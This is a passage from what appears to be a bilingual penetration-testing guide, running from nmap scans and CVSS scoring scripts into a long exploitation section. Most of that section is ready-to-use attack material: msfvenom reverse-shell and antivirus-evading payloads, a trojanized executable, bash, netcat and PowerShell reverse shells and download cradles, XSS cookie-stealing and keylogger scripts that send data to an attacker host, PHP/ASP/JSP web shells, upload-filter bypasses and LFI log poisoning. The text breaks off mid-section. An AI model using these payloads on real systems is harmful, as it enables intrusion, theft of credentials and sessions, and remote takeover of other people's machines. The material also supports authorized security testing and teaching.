nmap --script dns-brute,dns-cache-snoop,dns-check-zone,dns-fuzz,dns-nsec-enum,dns-nsec3-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zeustracker,dns-zone-transfer -p 53 10.10.10.1

# HTTP/HTTPS vulnerabilities
nmap --script http-* -p 80,443 10.10.10.1

# SNMP vulnerabilities
nmap --script snmp-* -p 161 10.10.10.1
nmap --script snmp-brute,snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-ios-config,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users -p 161 10.10.10.1

# LDAP vulnerabilities
nmap --script ldap-* -p 389,636 10.10.10.1

# NFS vulnerabilities
nmap --script nfs-* -p 2049 10.10.10.1
showmount -e 10.10.10.1

# VNC vulnerabilities
nmap --script vnc-* -p 5900 10.10.10.1

# RDP vulnerabilities
nmap --script rdp-* -p 3389 10.10.10.1
```

### Vulnerability Prioritization Framework

#### CVSS Score Calculation and Risk Assessment
```bash
# Manual CVSS v3.1 calculation factors:
# Base Score: Exploitability + Impact
# Exploitability Metrics:
# - Attack Vector (Network/Adjacent/Local/Physical): 0.85/0.62/0.55/0.2
# - Attack Complexity (Low/High): 0.77/0.44
# - Privileges Required (None/Low/High): 0.85/0.62/0.27
# - User Interaction (None/Required): 0.85/0.62

# Impact Metrics:
# - Confidentiality Impact (None/Low/High): 0/0.22/0.56
# - Integrity Impact (None/Low/High): 0/0.22/0.56
# - Availability Impact (None/Low/High): 0/0.22/0.56

# Example calculations:
# Critical SQLi: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
# Stored XSS: AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.4
# Local privilege escalation: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 7.8

# CVSS calculator script
cat << 'EOF' > cvss_calculator.py
#!/usr/bin/env python3
def calculate_cvss_base(av, ac, pr, ui, s, c, i, a):
    # Attack Vector
    av_values = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.2}
    # Attack Complexity  
    ac_values = {'L': 0.77, 'H': 0.44}
    # Privileges Required
    pr_values = {'N': 0.85, 'L': 0.62, 'H': 0.27}
    # User Interaction
    ui_values = {'N': 0.85, 'R': 0.62}
    # Impact values
    impact_values = {'N': 0, 'L': 0.22, 'H': 0.56}
    
    exploitability = 8.22 * av_values[av] * ac_values[ac] * pr_values[pr] * ui_values[ui]
    
    if s == 'U':  # Unchanged
        impact = 6.42 * (1 - (1 - impact_values[c]) * (1 - impact_values[i]) * (1 - impact_values[a]))
    else:  # Changed
        impact = 7.52 * (1 - (1 - impact_values[c]) * (1 - impact_values[i]) * (1 - impact_values[a])) - 0.029
    
    if impact <= 0:
        base_score = 0
    elif s == 'U':
        base_score = min(10, (impact + exploitability))
    else:
        base_score = min(10, 1.08 * (impact + exploitability))
        
    return round(base_score, 1)

# Example usage
print("SQL Injection (Critical):", calculate_cvss_base('N', 'L', 'N', 'N', 'U', 'H', 'H', 'H'))
print("Stored XSS:", calculate_cvss_base('N', 'L', 'L', 'R', 'C', 'L', 'L', 'N'))
print("Local Privesc:", calculate_cvss_base('L', 'L', 'L', 'N', 'U', 'H', 'H', 'H'))
EOF

python3 cvss_calculator.py
```

#### Risk Assessment Matrix and Prioritization
```bash
# Create comprehensive vulnerability assessment report
cat << 'EOF' > vuln_assessment_template.md
# VULNERABILITY ASSESSMENT REPORT

## Executive Summary
- **Total Vulnerabilities Found**: X
- **Critical**: X (CVSS 9.0-10.0)
- **High**: X (CVSS 7.0-8.9)  
- **Medium**: X (CVSS 4.0-6.9)
- **Low**: X (CVSS 0.1-3.9)

## Risk Heat Map
| Vulnerability | CVSS | Exploitability | Impact | Risk Level |
|---------------|------|----------------|--------|------------|
| SQL Injection | 9.8 | High | Critical | CRITICAL |
| RCE in Web App | 9.0 | High | Critical | CRITICAL |
| Privilege Escalation | 7.8 | Medium | High | HIGH |
| Information Disclosure | 5.3 | Medium | Medium | MEDIUM |

## Detailed Findings

### VULN-001: SQL Injection in Login Form
**Asset**: http://10.10.10.1/login.php
**CVSS Score**: 9.8 (Critical)
**CWE**: CWE-89 (SQL Injection)

**Technical Description**: 
The web application's login form is vulnerable to SQL injection attacks through the 'username' parameter.

**Proof of Concept**:
```sql
' OR 1=1-- 
' UNION SELECT 1,@@version,database()-- 
```

**Evidence**: [Screenshots and command outputs]

**Business Impact**:
- Complete database compromise
- Authentication bypass
- Potential data theft of customer information
- Compliance violations (GDPR, PCI-DSS)

**Recommendation**:
1. Immediate: Use parameterized queries/prepared statements
2. Implement input validation and sanitization
3. Apply principle of least privilege to database accounts
4. Enable query logging and monitoring

**Remediation Priority**: IMMEDIATE (0-7 days)

---

### VULN-002: Outdated Apache Server (CVE-2021-44228)
**Asset**: http://10.10.10.1:80
**CVSS Score**: 8.5 (High)
**CVE**: CVE-2021-44228 (Log4Shell)

**Technical Description**:
Apache server running version 2.4.29 with vulnerable Log4j library susceptible to remote code execution.

**Proof of Concept**:
```bash
curl -H "User-Agent: ${jndi:ldap://attacker.com/a}" http://10.10.10.1/
```

**Evidence**: Server response headers showing Apache/2.4.29

**Business Impact**:
- Remote code execution
- Complete server compromise
- Lateral movement possibilities

**Recommendation**:
1. Update Apache to latest version
2. Update Log4j to version 2.17.0 or later
3. Implement WAF rules to block JNDI lookup patterns

**Remediation Priority**: HIGH (1-14 days)

EOF
```

#### Automated Risk Scoring and Reporting
```bash
# Create vulnerability management script
cat << 'EOF' > vuln_manager.py
#!/usr/bin/env python3
import json
import csv
from datetime import datetime

class VulnerabilityManager:
    def __init__(self):
        self.vulnerabilities = []
        
    def add_vulnerability(self, vuln_data):
        """Add vulnerability with automatic risk scoring"""
        vuln_data['risk_score'] = self.calculate_risk_score(vuln_data)
        vuln_data['priority'] = self.get_priority(vuln_data['cvss'])
        vuln_data['found_date'] = datetime.now().strftime('%Y-%m-%d')
        self.vulnerabilities.append(vuln_data)
    
    def calculate_risk_score(self, vuln):
        """Calculate business risk score"""
        cvss = vuln.get('cvss', 0)
        exploitability = vuln.get('exploitability', 'Unknown')
        asset_criticality = vuln.get('asset_criticality', 'Medium')
        
        # Weighting factors
        cvss_weight = cvss * 0.4
        
        exploit_weights = {
            'High': 4, 'Medium': 3, 'Low': 2, 'Unknown': 1
        }
        exploit_weight = exploit_weights.get(exploitability, 1) * 0.3
        
        asset_weights = {
            'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1
        }
        asset_weight = asset_weights.get(asset_criticality, 2) * 0.3
        
        return cvss_weight + exploit_weight + asset_weight
    
    def get_priority(self, cvss):
        """Get remediation priority based on CVSS"""
        if cvss >= 9.0:
            return "CRITICAL - 0-7 days"
        elif cvss >= 7.0:
            return "HIGH - 1-14 days"
        elif cvss >= 4.0:
            return "MEDIUM - 1-30 days"
        else:
            return "LOW - Next maintenance window"
    
    def generate_report(self, format='console'):
        """Generate vulnerability report"""
        if format == 'console':
            self.print_console_report()
        elif format == 'csv':
            self.export_csv()
        elif format == 'json':
            self.export_json()
    
    def print_console_report(self):
        """Print formatted console report"""
        print("\n" + "="*80)
        print("VULNERABILITY ASSESSMENT REPORT")
        print("="*80)
        
        # Summary
        total = len(self.vulnerabilities)
        critical = len([v for v in self.vulnerabilities if v['cvss'] >= 9.0])
        high = len([v for v in self.vulnerabilities if 7.0 <= v['cvss'] < 9.0])
        medium = len([v for v in self.vulnerabilities if 4.0 <= v['cvss'] < 7.0])
        low = len([v for v in self.vulnerabilities if v['cvss'] < 4.0])
        
        print(f"\nSUMMARY:")
        print(f"Total Vulnerabilities: {total}")
        print(f"Critical: {critical} | High: {high} | Medium: {medium} | Low: {low}")
        
        # Top vulnerabilities
        print(f"\nTOP RISK VULNERABILITIES:")
        sorted_vulns = sorted(self.vulnerabilities, 
                            key=lambda x: x['risk_score'], reverse=True)
        
        for vuln in sorted_vulns[:5]:
            print(f"\n{vuln['name']}")
            print(f"  Asset: {vuln['asset']}")
            print(f"  CVSS: {vuln['cvss']} | Risk Score: {vuln['risk_score']:.1f}")
            print(f"  Priority: {vuln['priority']}")
    
    def export_csv(self, filename='vulnerability_report.csv'):
        """Export vulnerabilities to CSV"""
        with open(filename, 'w', newline='') as csvfile:
            fieldnames = ['name', 'asset', 'cvss', 'cwe', 'priority', 
                         'risk_score', 'found_date', 'description']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for vuln in self.vulnerabilities:
                writer.writerow(vuln)
        print(f"CSV report exported to {filename}")
    
    def export_json(self, filename='vulnerability_report.json'):
        """Export vulnerabilities to JSON"""
        with open(filename, 'w') as jsonfile:
            json.dump(self.vulnerabilities, jsonfile, indent=2)
        print(f"JSON report exported to {filename}")

# Example usage
if __name__ == "__main__":
    vm = VulnerabilityManager()
    
    # Add sample vulnerabilities
    vm.add_vulnerability({
        'name': 'SQL Injection in Login Form',
        'asset': 'http://10.10.10.1/login.php',
        'cvss': 9.8,
        'cwe': 'CWE-89',
        'exploitability': 'High',
        'asset_criticality': 'Critical',
        'description': 'Authentication bypass via SQL injection'
    })
    
    vm.add_vulnerability({
        'name': 'Apache Log4Shell Vulnerability',
        'asset': 'http://10.10.10.1:80',
        'cvss': 8.5,
        'cwe': 'CWE-20',
        'exploitability': 'High',
        'asset_criticality': 'High',
        'description': 'Remote code execution via Log4j JNDI injection'
    })
    
    # Generate reports
    vm.generate_report('console')
    vm.generate_report('csv')
    vm.generate_report('json')
EOF

python3 vuln_manager.py
```

---

## ⚡ Fase 5: Explotación

### Objetivo
Convertir vulnerabilidades identificadas en acceso real al sistema, validando el impacto de cada fallo encontrado de manera controlada y documentada.

### Exploitation Frameworks

#### 1. Metasploit Framework - Complete Guide
```bash
# Iniciar Metasploit
msfconsole

# Actualizar base de datos
msfdb init
msfdb reinit  # Si hay problemas
msfdb status  # Verificar estado

# Comandos básicos de navegación
help
help search
show -h

# Búsqueda de exploits avanzada
search MS17-010
search apache
search type:exploit platform:linux
search cve:2017-0144
search name:eternalblue
search rank:excellent
search app:client

# Filtros de búsqueda específicos
search platform:windows type:exploit rank:excellent
search cve:2021 platform:linux
search target:windows disclosure_date:2017

# Información detallada del exploit
info exploit/windows/smb/ms17_010_eternalblue
show info
show options
show targets
show payloads

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue
use 0  # Si es el primer resultado de búsqueda

# Configurar opciones básicas
set RHOSTS 10.10.10.1
set RHOST 10.10.10.1
set RPORT 445
set LHOST 10.10.14.1
set LPORT 4444

# Configurar payload
set payload windows/x64/meterpreter/reverse_tcp
set payload windows/meterpreter/reverse_tcp
set payload linux/x64/meterpreter/reverse_tcp

# Opciones avanzadas
show advanced
set ConnectTimeout 30
set VERBOSE true
set AutoCheck false

# Verificar configuración
show options
show missing
check  # Verificar si el objetivo es vulnerable

# Ejecutar exploit
exploit
run
exploit -j  # En background

# Gestión de sesiones
sessions
sessions -l
sessions -i 1
sessions -k 1
sessions -K  # Matar todas las sesiones

# Exploits múltiples
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/http_version
run

# Workspace management
workspace
workspace -a pentesting_project
workspace -d old_workspace
workspace pentesting_project

# Database queries
hosts
services
loot
creds
notes

# Resource scripts
resource /usr/share/metasploit-framework/scripts/resource/auto_brute.rc
resource /path/to/custom/script.rc

# Crear resource script personalizado
cat << 'EOF' > auto_exploit.rc
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,3306,3389,5432,5985,5986
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run

use auxiliary/scanner/http/http_version
set RHOSTS 10.10.10.0/24
run
EOF

resource auto_exploit.rc
```

#### 2. Payload Generation with MSFVenom
```bash
# Listar payloads disponibles
msfvenom -l payloads
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep php

# Listar formatos de salida
msfvenom -l formats

# Listar encoders
msfvenom -l encoders

# Payloads Windows
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > meterpreter.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell64.exe

# Payloads Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > shell64.elf

# Web payloads
msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f asp > shell.asp

# Payloads con encoding (evasión de antivirus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x86/countdown -i 3 -f exe > countdown_shell.exe

# Multiple encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x86/shikata_ga_nai -e x86/countdown -i 3 -f exe > multi_encoded.exe

# Custom templates
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -x /path/to/original.exe -f exe -o trojan.exe

# Shellcode generation
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f c
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f python

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -o malicious.apk

# macOS payloads
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f macho > shell.macho

# Staged vs Non-staged payloads
# Non-staged (self-contained)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell_nonstaged.exe
# Staged (smaller initial payload, downloads second stage)
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell_staged.exe

# Bind shells
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > bind_shell.exe
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf > bind_shell.elf

# HTTPS payloads (encrypted communication)
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.1 LPORT=443 -f exe > https_shell.exe

# Custom payloads with specific options
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 HandlerSSLCert=/path/to/cert.pem -f exe > ssl_shell.exe
```

#### 3. Manual Exploit Development and Execution
```bash
# Compile C exploits
gcc -o exploit exploit.c
gcc -m32 -o exploit32 exploit.c  # 32-bit compilation
gcc -static -o exploit_static exploit.c  # Static compilation
gcc -g -o exploit_debug exploit.c  # With debug symbols

# Python exploit execution
python2 exploit.py 10.10.10.1 4444
python3 exploit.py 10.10.10.1 4444

# Exploit with custom shellcode
python3 exploit.py --target 10.10.10.1 --port 80 --shellcode custom_shellcode.bin

# Buffer overflow exploit template
cat << 'EOF' > buffer_overflow_template.py
#!/usr/bin/env python3
import socket
import struct

# Target configuration
target_ip = "10.10.10.1"
target_port = 9999

# Buffer overflow parameters
offset = 146  # Offset to EIP
bad_chars = b"\x00\x0a\x0d"  # Characters to avoid

# Shellcode (msfvenom generated)
shellcode = (
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    # ... rest of shellcode
)

# ROP gadgets (if DEP/NX bypass needed)
rop_gadgets = [
    0x625011af,  # POP EAX # RET
    0x41414141,  # Placeholder
    0x625010b4,  # JMP ESP
]

def create_exploit():
    exploit = b"A" * offset  # Buffer overflow
    exploit += struct.pack("<I", 0x625011af)  # EIP overwrite
    exploit += b"\x90" * 16  # NOP sled
    exploit += shellcode
    return exploit

def send_exploit():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        print(f"[+] Connecting to {target_ip}:{target_port}")
        
        exploit_payload = create_exploit()
        print(f"[+] Sending exploit payload ({len(exploit_payload)} bytes)")
        
        s.send(exploit_payload)
        s.close()
        
        print("[+] Exploit sent successfully!")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    send_exploit()
EOF

chmod +x buffer_overflow_template.py
```

### Web Application Exploitation

#### 1. SQL Injection Exploitation - Advanced Techniques
```bash
# SQLMap comprehensive usage
sqlmap -u "http://10.10.10.1/login.php" --data="username=admin&password=pass" --level=5 --risk=3 --batch

# Database enumeration workflow
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --dbs --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" -D database --tables --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" -D database -T users --columns --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" -D database -T users -C username,password --dump --batch

# Advanced SQLMap options
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --current-user --current-db --hostname --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --passwords --batch  # Dump password hashes
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --privileges --batch  # Check user privileges

# OS command execution
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --os-shell --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --os-cmd="whoami" --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --os-pwn --batch  # Meterpreter session

# File system access
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --file-read="/etc/passwd" --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# Advanced injection techniques
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --technique=BEUSTQ --batch  # All techniques
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --technique=B --batch  # Boolean-based blind
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --technique=T --batch  # Time-based blind
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --technique=U --batch  # UNION query

# HTTP header injection
sqlmap -u "http://10.10.10.1/" --headers="X-Forwarded-For: 1*" --batch
sqlmap -u "http://10.10.10.1/" --cookie="sessionid=abc123*" --batch
sqlmap -u "http://10.10.10.1/" --user-agent="Mozilla* 5.0" --batch

# JSON and XML injection
sqlmap -u "http://10.10.10.1/api/user" --data='{"id": 1*}' --content-type="application/json" --batch
sqlmap -r request.txt --batch  # From Burp Suite request file

# WAF bypass techniques
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --tamper=space2comment,charencode --batch
sqlmap -u "http://10.10.10.1/vuln.php?id=1" --tamper=randomcase,space2dash --batch

# Manual SQL injection payloads
# Authentication bypass
admin'--
admin'#
admin'/*
' or 1=1--
' or 1=1#
') or '1'='1--
') or ('1'='1--

# UNION-based injection
' UNION SELECT 1,2,3,4,5--
' UNION SELECT null,username,password,null,null FROM users--
' UNION SELECT @@version,user(),database(),4,5--

# Error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(rand(),concat(0x3a,version()))--

# Time-based blind injection
' AND (SELECT SLEEP(5))--
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))GDiu)--

# Boolean-based blind injection
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND LENGTH(database())>5--

# Second-order injection
# First request: Insert malicious payload
curl -X POST "http://10.10.10.1/register.php" -d "username=admin'--&password=test123"
# Second request: Trigger the stored payload
curl -X POST "http://10.10.10.1/profile.php" -d "user_id=1"

# NoSQL injection payloads
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
username[$ne]=admin&password[$ne]=admin
username[$gt]=&password[$gt]=
```

#### 2. Cross-Site Scripting (XSS) Exploitation
```bash
# Basic XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>

# Advanced XSS payloads
# Cookie stealing
<script>document.location='http://10.10.14.1/steal.php?cookie='+document.cookie</script>
<script>new Image().src='http://10.10.14.1/steal.php?cookie='+btoa(document.cookie)</script>

# Session hijacking
<script>fetch('http://10.10.14.1/steal.php?session='+encodeURIComponent(document.cookie))</script>

# Keylogger
<script>
document.addEventListener('keydown', function(e) {
    fetch('http://10.10.14.1/keylog.php?key=' + e.key);
});
</script>

# DOM manipulation
<script>
document.getElementById('login-form').action = 'http://10.10.14.1/steal.php';
</script>

# Phishing redirection
<script>
if(document.domain == 'trusted-site.com') {
    window.location = 'http://evil-site.com/phish.html';
}
</script>

# BeEF (Browser Exploitation Framework) hook
<script src="http://10.10.14.1:3000/hook.js"></script>

# WAF bypass XSS payloads
<img src=1 onerror=alert(String.fromCharCode(88,83,83))>
<svg/onload=alert(/XSS/)>
<iframe srcdoc="&lt;script&gt;alert&lpar;'XSS'&rpar;&lt;/script&gt;">
<details ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>

# Filter bypass techniques
<ScRiPt>alert('XSS')</ScRiPt>
<script>al\u0065rt('XSS')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

# DOM-based XSS
# URL: http://site.com/page.html#<img src=x onerror=alert('XSS')>
<script>
var hash = location.hash.substr(1);
document.write(hash);
</script>

# Stored XSS in comments/profiles
<script>
// Persistent payload that executes every time page loads
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://10.10.14.1/log.php?victim=' + document.domain, true);
xhr.send();
</script>

# CSP bypass techniques (Content Security Policy)
<link rel=dns-prefetch href="//evil.com">
<script nonce="known-nonce">alert('XSS')</script>
<base href="http://evil.com/">

# XSS in different contexts
# Inside HTML attributes
" onmouseover="alert('XSS')
'><script>alert('XSS')</script>

# Inside JavaScript
'; alert('XSS');//
\'-alert(\'XSS\')-\'

# Inside CSS
</style><script>alert('XSS')</script>

# XSS automation with XSStrike
python3 xsstrike.py -u "http://10.10.10.1/search.php?q=test" --crawl
python3 xsstrike.py -u "http://10.10.10.1/search.php?q=test" --blind
python3 xsstrike.py -u "http://10.10.10.1/search.php?q=test" --skip-dom
```

#### 3. Command Injection Exploitation
```bash
# Basic command injection payloads
; id
| whoami
& dir
$(whoami)
`id`
${IFS}id

# Bypassing filters and restrictions
# Spaces
{IFS}
$IFS$9
${IFS}
<TAB>
/**/

# Quotes and special characters
; wh""oami
; who'ami'
; wh$()oami
; echo$IFS$9$USER

# Encoding techniques
; %77%68%6f%61%6d%69  # whoami in URL encoding
; \x77\x68\x6f\x61\x6d\x69  # whoami in hex

# Using environment variables
; echo $HOME
; echo $PATH
; echo $USER

# Alternative commands
; /usr/bin/id
; /bin/whoami
; which id
; whereis whoami

# Time delays for blind injection
; sleep 10
; ping -c 4 127.0.0.1
; timeout 10

# Out-of-band command injection
; curl http://10.10.14.1:8080/$(whoami)
; wget http://10.10.14.1:8080/$(id|base64)
; nslookup $(whoami).attacker.com
; dig $(id|base64|cut -c1-20).attacker.com

# Reverse shells via command injection
; bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
; nc -e /bin/bash 10.10.14.1 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Windows command injection
& whoami
& dir C:\
& type C:\windows\system32\drivers\etc\hosts
& net user
& systeminfo

# PowerShell execution
; powershell -c "Get-Process"
; powershell -enc <base64_encoded_command>
; powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/shell.ps1')"

# Automated command injection with Commix
python commix.py --url="http://10.10.10.1/ping.php?ip=127.0.0.1" --batch
python commix.py --url="http://10.10.10.1/ping.php" --data="ip=127.0.0.1" --batch
python commix.py -r request.txt --batch
```

#### 4. File Upload Vulnerabilities
```bash
# PHP web shells
# Simple PHP shell
<?php system($_GET['cmd']); ?>
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"'); ?>

# Advanced PHP shell
<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    if(function_exists('system')){
        system($cmd . ' 2>&1');
    } elseif(function_exists('exec')){
        exec($cmd . ' 2>&1', $output);
        foreach($output as $line){
            echo $line . "\n";
        }
    } elseif(function_exists('shell_exec')){
        echo shell_exec($cmd . ' 2>&1');
    } elseif(function_exists('passthru')){
        passthru($cmd . ' 2>&1');
    }
}
?>

# Bypassing upload restrictions
# Extension bypasses
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php.;.jpg
shell.pHP
shell.php5
shell.phtml
shell.inc

# Content-Type bypasses
# Upload with modified Content-Type header
curl -X POST -F "file=@shell.php" -H "Content-Type: image/jpeg" http://10.10.10.1/upload.php

# Magic number/file signature bypasses
# Add JPEG signature to PHP file
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xDB\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0C\x14\r\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C $.\' ",#\x1C\x1C(7),01444\x1F\'9=82<.342\xFF\xC0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00' > malicious.jpg

# Then append PHP code
echo '<?php system($_GET["cmd"]); ?>' >> malicious.jpg

# ASP/ASPX shells
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    if (Request.QueryString["cmd"] != null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
}
</script>

# JSP shell
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>

# Polyglot files (valid as multiple file types)
# GIF+PHP polyglot
GIF89a<?php system($_GET['cmd']); ?>

# PNG+PHP polyglot
\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x01\x03\x00\x00\x00%\xdbV\xca\x00\x00\x00\x03PLTE\x00\x00\x00\xa7z=\xda\x00\x00\x00\x01tRNS\x00@\xe6\xd8f\x00\x00\x00\nIDATx\x9cc\x60\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82<?php system($_GET['cmd']); ?>

# ZIP archive upload with path traversal
# Create malicious archive that extracts to parent directories
python3 -c "
import zipfile
with zipfile.ZipFile('malicious.zip', 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
"

# Image metadata injection
# ExifTool to inject PHP in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

#### 5. Local File Inclusion (LFI) / Remote File Inclusion (RFI)
```bash
# Basic LFI payloads
http://10.10.10.1/page.php?file=../../../etc/passwd
http://10.10.10.1/page.php?file=....//....//....//etc/passwd
http://10.10.10.1/page.php?file=..%2F..%2F..%2Fetc%2Fpasswd

# Windows LFI
http://10.10.10.1/page.php?file=..\..\..\windows\system32\drivers\etc\hosts
http://10.10.10.1/page.php?file=C:\windows\system32\config\sam

# Null byte injection (older PHP versions)
http://10.10.10.1/page.php?file=../../../etc/passwd%00
http://10.10.10.1/page.php?file=../../../etc/passwd%00.jpg

# Double encoding bypass
http://10.10.10.1/page.php?file=..%252f..%252f..%252fetc%252fpasswd

# Log poisoning via LFI
# First, poison the log file
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://10.10.10.1/
# Then include the log file
http://10.10.10.1/page.php?file=/var/log/apache2/access.log&cmd=whoami

# SSH log poisoning
ssh '<?php system($_GET["cmd"]); ?>'@10.10.10.1
http://10.10.10.1/page.php?file=/var/log/auth.log&cmd=id

# Proc self environ injection
http://10.10.10.1/page.php?file=/proc/self/environ
# With User-Agent: <?php system($_GET['cmd']); ?>

# PHP wrappers exploitation
# Base64 encoding to read PHP source
